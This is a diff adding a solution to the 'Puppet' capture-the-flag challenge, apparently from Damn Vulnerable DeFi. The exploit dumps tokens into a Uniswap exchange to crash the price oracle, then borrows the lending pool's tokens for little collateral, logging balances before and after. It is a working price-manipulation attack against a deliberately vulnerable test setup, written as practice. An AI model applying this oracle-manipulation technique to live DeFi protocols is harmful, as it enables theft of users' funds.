@@ -103,6 +103,86 @@ describe('[Challenge] Puppet', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+    //*********************************************************************************************************************
+
+        // just for ethers practice: same information is in line 18 to 23
+        console.log('\n------- Check Before -----------------------\n');
+
+        let uniswapDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.uniswapExchange.address));
+        let uniswapDVTBalance = ethers.utils.formatEther(uniswapDVTBigNumber);
+
+        let uniswapEthBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.uniswapExchange.address));
+        let uniswapEthBalance = ethers.utils.formatEther(uniswapEthBigNumber);
+        
+        let attackerDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(attacker.address));
+        let attackerDVTBalance = ethers.utils.formatEther(attackerDVTBigNumber);
+
+        let attackerETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(attacker.address));
+        let attackerETHBalance = ethers.utils.formatEther(attackerETHBigNumber);
+
+        let poolBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.lendingPool.address))
+        let poolBalance = ethers.utils.formatEther(poolBigNumber);''
+        
+        let poolETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.lendingPool.address));
+        let poolETHBalance = ethers.utils.formatEther(poolETHBigNumber);
+
+        console.log("Uniswap DVT Balance: ", uniswapDVTBalance);
+        console.log("Uniswap Eth Balacne: ", uniswapEthBalance);
+        console.log("Attacker DVT Balance: ", attackerDVTBalance);
+        console.log("Attacker Eth Balacne: ", attackerETHBalance);
+        console.log("Lending Pool DVT Balacne: ", poolBalance);
+        console.log("Lending Pool ETH Balacne: ", poolETHBalance);
+    
+    //*********************************************************************************************************************
+        
+        console.log('\n------- Exploit ----------------------------\n');
+
+        const deadline = (await ethers.provider.getBlock("latest")).timestamp * 2;
+        await this.token.connect(attacker).approve(this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
+        await this.uniswapExchange.connect(attacker).tokenToEthSwapInput(ATTACKER_INITIAL_TOKEN_BALANCE.sub(ATTACKER_INITIAL_TOKEN_BALANCE.div(100)), '1', deadline);
+
+        const afterSwap_uniswapDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.uniswapExchange.address));
+        const afterSwap_uniswapDVTBalance = ethers.utils.formatEther(afterSwap_uniswapDVTBigNumber);
+        const afterSwap_uniswapETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.uniswapExchange.address));
+        const afterSwap_uniswapETHBalance = ethers.utils.formatEther(afterSwap_uniswapETHBigNumber);
+        
+        console.log("After Swap # of DVT: ", afterSwap_uniswapDVTBalance);
+        console.log("After Swap # of ETH: ", afterSwap_uniswapETHBalance);
+
+        const sendValue = {value: ethers.utils.parseEther("24.0")}        
+        const attackValue = ethers.utils.parseEther("100000")
+        this.lendingPool.connect(attacker).borrow(attackValue, sendValue);
+
+        
+
+    //*********************************************************************************************************************
+        console.log('\n------- After Exploit ----------------------\n');
+
+         uniswapDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.uniswapExchange.address));
+         uniswapDVTBalance = ethers.utils.formatEther(uniswapDVTBigNumber);
+
+         uniswapEthBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.uniswapExchange.address));
+         uniswapEthBalance = ethers.utils.formatEther(uniswapEthBigNumber);
+        
+         attackerDVTBigNumber = ethers.BigNumber.from(await this.token.balanceOf(attacker.address));
+         attackerDVTBalance = ethers.utils.formatEther(attackerDVTBigNumber);
+
+         attackerETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(attacker.address));
+         attackerETHBalance = ethers.utils.formatEther(attackerETHBigNumber);
+
+         poolBigNumber = ethers.BigNumber.from(await this.token.balanceOf(this.lendingPool.address))
+         poolBalance = ethers.utils.formatEther(poolBigNumber);''
+        
+         poolETHBigNumber = ethers.BigNumber.from(await ethers.provider.getBalance(this.lendingPool.address));
+         poolETHBalance = ethers.utils.formatEther(poolETHBigNumber);
+
+        console.log("Uniswap DVT Balance: ", uniswapDVTBalance);
+        console.log("Uniswap Eth Balacne: ", uniswapEthBalance);
+        console.log("Attacker DVT Balance: ", attackerDVTBalance);
+        console.log("Attacker Eth Balacne: ", attackerETHBalance);
+        console.log("Lending Pool DVT Balacne: ", poolBalance);
+        console.log("Lending Pool ETH Balacne: ", poolETHBalance);        
     });
 
     after(async function () {
